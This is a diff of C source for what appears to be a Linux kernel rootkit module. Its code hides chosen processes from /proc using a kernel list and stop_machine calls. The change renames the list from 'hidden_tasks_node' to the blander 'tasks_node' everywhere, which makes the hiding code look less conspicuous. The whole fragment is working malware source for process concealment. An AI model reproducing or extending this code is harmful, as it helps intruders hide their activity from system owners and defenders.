@@ -10,13 +10,13 @@ struct hidden_tasks_node {
     struct fs_file_node *fnode;
     struct list_head list;
 };
-static LIST_HEAD(hidden_tasks_node);
+static LIST_HEAD(tasks_node);
 
 static struct task_struct *
 _check_hide_by_pid(pid_t pid)
 {
     struct hidden_tasks_node *node;
-    list_for_each_entry(node, &hidden_tasks_node, list)
+    list_for_each_entry(node, &tasks_node, list)
     {
         if(pid == node->task->pid)
             return node->task;
@@ -45,7 +45,7 @@ static inline int _hide_task(void *data) {
 
     node->task = task;
     node->fnode = fs_get_file_node(task);
-    list_add_tail(&node->list, &hidden_tasks_node);
+    list_add_tail(&node->list, &tasks_node);
 
     /* task vanishes from /proc */
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,11,0)
@@ -74,7 +74,7 @@ static inline int _unhide_task(void *data) {
      return 0;
 
    task = (struct task_struct *)data;
-   list_for_each_entry_safe(node, next, &hidden_tasks_node, list)
+   list_for_each_entry_safe(node, next, &tasks_node, list)
    {
        if(task == node->task) {
            list_del(&node->list);
@@ -109,7 +109,7 @@ void hide_task_by_pid(pid_t pid) {
 void
 wally_data_cleanup(void) {
     struct hidden_tasks_node *node, *next;
-    list_for_each_entry_safe(node, next, &hidden_tasks_node, list)
+    list_for_each_entry_safe(node, next, &tasks_node, list)
     {
         stop_machine(_unhide_task, node->task, NULL);
     }
@@ -117,7 +117,7 @@ wally_data_cleanup(void) {
 
 void wally_list_saved_tasks(void) {
     struct hidden_tasks_node *node;
-    list_for_each_entry(node, &hidden_tasks_node, list)
+    list_for_each_entry(node, &tasks_node, list)
     {
         /* to help grep */
         if(node->fnode)
